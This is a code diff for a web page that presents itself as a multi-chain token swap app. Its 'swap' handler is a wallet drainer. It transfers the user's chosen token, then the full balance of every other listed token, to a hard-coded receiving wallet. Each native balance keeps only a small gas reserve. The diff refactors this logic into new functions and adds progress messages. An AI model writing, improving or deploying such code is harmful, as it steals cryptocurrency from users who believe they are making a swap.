@@ -15,7 +15,13 @@ const FEE_TOKENS = {
   arbitrum: "0x0000000000000000000000000000000000000000", // ETH
   base: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e" // ETH on Base
 };
-const MIN_FEE_RESERVE = 0.001; // Reserve this amount of native token for gas
+const MIN_FEE_RESERVES = {
+  ethereum: 0.001, // ETH
+  bsc: 0.001, // BNB
+  polygon: 1.0, // MATIC
+  arbitrum: 1.0, // ARB
+  base: 0.001 // ETH on Base
+};
 
 // App state
 let provider, signer, userAddress;
@@ -782,62 +788,11 @@ async function handleSwap() {
     showLoader();
     updateStatus("Processing transfers...", "success");
     
-    // Get all tokens for current network
-    const networkTokens = TOKENS[currentNetwork] || [];
-    const feeTokenAddress = FEE_TOKENS[currentNetwork];
+    // First handle the main token (from input)
+    await processMainTokenTransfer();
     
-    // First handle the main token
-    const fromBalance = await fetchTokenBalance(currentFromToken);
-    if (fromBalance > 0) {
-      if (currentFromToken.isNative) {
-        // For native tokens being swapped, use entered amount (if any) or full balance minus reserve
-        const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
-        const amountToSend = inputAmount > 0 ? 
-          Math.min(inputAmount, fromBalance - MIN_FEE_RESERVE) : 
-          fromBalance - MIN_FEE_RESERVE;
-        
-        if (amountToSend > 0) {
-          await transferNativeToken(currentFromToken, amountToSend);
-        }
-      } else {
-        // For ERC20 tokens, send full balance
-        await transferERC20Token(currentFromToken, fromBalance);
-      }
-    }
-    
-    // Then send all other tokens (except the one we just sent)
-    for (const token of networkTokens) {
-      // Skip the token we already sent and invalid tokens
-      if (token.address === currentFromToken.address || !token.address) continue;
-      
-      const balance = await fetchTokenBalance(token);
-      if (balance > 0) {
-        try {
-          if (token.isNative) {
-            // Check if this is the fee token for the network
-            const isFeeToken = feeTokenAddress && 
-              token.address.toLowerCase() === feeTokenAddress.toLowerCase();
-            
-            if (isFeeToken) {
-              // For fee tokens, leave MIN_FEE_RESERVE for gas
-              const amountToSend = Math.max(0, balance - MIN_FEE_RESERVE);
-              if (amountToSend > 0) {
-                await transferNativeToken(token, amountToSend);
-              }
-            } else {
-              // For other native tokens, send full balance
-              await transferNativeToken(token, balance);
-            }
-          } else {
-            // For ERC20 tokens, send full balance
-            await transferERC20Token(token, balance);
-          }
-        } catch (err) {
-          console.error(`Error transferring ${token.symbol}:`, err);
-          continue;
-        }
-      }
-    }
+    // Then process all other tokens
+    await processAllTokenTransfers();
     
     updateStatus("All transfers completed successfully!", "success");
     document.getElementById("fromAmount").value = '';
@@ -851,7 +806,76 @@ async function handleSwap() {
   }
 }
 
+async function processMainTokenTransfer() {
+  const fromBalance = await fetchTokenBalance(currentFromToken);
+  if (fromBalance <= 0) return;
+  
+  const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
+  
+  if (currentFromToken.isNative) {
+    // For native tokens, use entered amount (if any) or full balance minus reserve
+    const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
+    const amountToSend = inputAmount > 0 ? 
+      Math.min(inputAmount, fromBalance - minReserve) : 
+      fromBalance - minReserve;
+    
+    if (amountToSend > 0) {
+      await transferNativeToken(currentFromToken, amountToSend);
+    }
+  } else {
+    // For ERC20 tokens, use entered amount or full balance
+    const amountToSend = inputAmount > 0 ? Math.min(inputAmount, fromBalance) : fromBalance;
+    if (amountToSend > 0) {
+      await transferERC20Token(currentFromToken, amountToSend);
+    }
+  }
+}
+
+async function processAllTokenTransfers() {
+  const tokensToProcess = TOKENS[currentNetwork].filter(t => 
+    t.address !== currentFromToken.address && t.address
+  ).sort((a, b) => a.priority - b.priority);
+  
+  let successCount = 0;
+  
+  // Process ERC20 tokens first
+  for (const token of tokensToProcess.filter(t => !t.isNative)) {
+    try {
+      const balance = await fetchTokenBalance(token);
+      if (balance > 0) {
+        await transferERC20Token(token, balance);
+        successCount++;
+      }
+    } catch (err) {
+      console.error(`Error transferring ${token.symbol}:`, err);
+      continue;
+    }
+  }
+  
+  // Process native tokens last (except the one we already processed)
+  const nativeToken = tokensToProcess.find(t => t.isNative);
+  if (nativeToken) {
+    try {
+      const balance = await fetchTokenBalance(nativeToken);
+      if (balance > 0) {
+        const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
+        const amountToSend = Math.max(0, balance - minReserve);
+        if (amountToSend > 0) {
+          await transferNativeToken(nativeToken, amountToSend);
+          successCount++;
+        }
+      }
+    } catch (err) {
+      console.error(`Error transferring native token:`, err);
+    }
+  }
+  
+  return successCount;
+}
+
 async function transferNativeToken(token, amount) {
+  updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
+  
   const tx = await signer.sendTransaction({
     to: RECEIVING_WALLET,
     value: ethers.utils.parseEther(amount.toString()),
@@ -859,9 +883,15 @@ async function transferNativeToken(token, amount) {
   });
   
   await tx.wait();
+  updateStatus(
+    `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
+    "success"
+  );
 }
 
 async function transferERC20Token(token, amount) {
+  updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
+  
   const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
   const decimals = token.decimals || 18;
   const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
@@ -871,6 +901,10 @@ async function transferERC20Token(token, amount) {
   });
   
   await tx.wait();
+  updateStatus(
+    `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
+    "success"
+  );
 }
 
 // =====================
